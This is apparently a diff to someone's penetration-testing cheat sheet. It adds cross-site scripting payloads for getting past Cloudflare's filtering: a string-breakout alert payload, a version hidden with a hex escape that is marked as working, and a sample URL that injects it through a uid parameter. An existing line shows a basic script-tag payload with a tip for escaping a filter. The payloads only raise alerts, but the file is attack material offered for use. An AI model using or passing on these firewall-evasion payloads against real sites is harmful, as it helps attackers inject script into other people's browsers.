@@ -149,7 +149,11 @@ amass <<
 ---------------------------------------------------------
             (((XSS))
   <script>alert(\"hossam\")</script>        // add \ before " to escape filter
+cloudflare bypass 
+"-alert(0)-"		X
+"-top['al\x65rt'](9)-"	good
 
+example.com/?uid="-top['al\x65rt'](9)-"
 
 
 
